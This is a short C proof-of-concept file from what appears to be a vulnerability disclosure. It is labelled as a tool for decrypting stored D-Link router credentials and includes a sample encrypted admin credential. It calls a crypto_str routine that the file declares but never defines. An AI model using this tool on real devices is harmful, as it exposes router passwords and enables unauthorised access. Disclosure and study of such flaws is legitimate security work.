/*

D-Link credentials decryption tool poc.
https://github.com/full-disclosure/FDEU-CVE-2021-525A

Example encrypted data:

96f6e6cab3c87a5c5c419aa7208711f6:admin

*/

#include<stdio.h>

int crypto_str(char *, char **, int);

int main(int argc, char** argv)
{
	char buf[128];
	char **ptr;
	int res;

	if (argc < 2)
	{
		printf ("Usage: %s pass\n", argv[0]);
		return 1;
	}

	ptr = (char**)&buf;

	res = crypto_str (argv[1], ptr, 0);
	printf ("Decrypted: %s\n", *ptr);

	return 0;
}

